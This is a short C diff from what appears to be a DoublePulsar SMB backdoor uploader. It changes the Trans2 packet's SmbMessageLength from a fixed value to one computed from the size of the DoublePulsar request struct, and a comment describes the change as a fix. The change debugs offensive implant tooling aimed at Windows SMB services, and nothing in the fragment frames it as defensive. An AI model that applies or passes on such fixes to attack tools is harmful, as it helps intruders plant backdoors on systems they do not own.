@@ -209,7 +209,11 @@ int main(int argc, char* argv[])
 	uploadpacket.ProtocolHeader[2] = 'M';
 	uploadpacket.ProtocolHeader[3] = 'B';
 	uploadpacket.SmbCommand = 0x32; //Trans2 
-	uploadpacket.SmbMessageLength = SWAP_SHORT(0x4e);
+	
+	//fix here because the value needs to be dynamic not static
+	//uploadpacket.SmbMessageLength = SWAP_SHORT(0x4e);
+	uploadpacket.SmbMessageLength = sizeof(struct SMB_DOUBLEPULSAR_REQUEST);
+	
 	uploadpacket.ProcessIDHigh = 0x0000;
 	uploadpacket.NtStatus = 0x00000000;
 	uploadpacket.flags = 0x18;
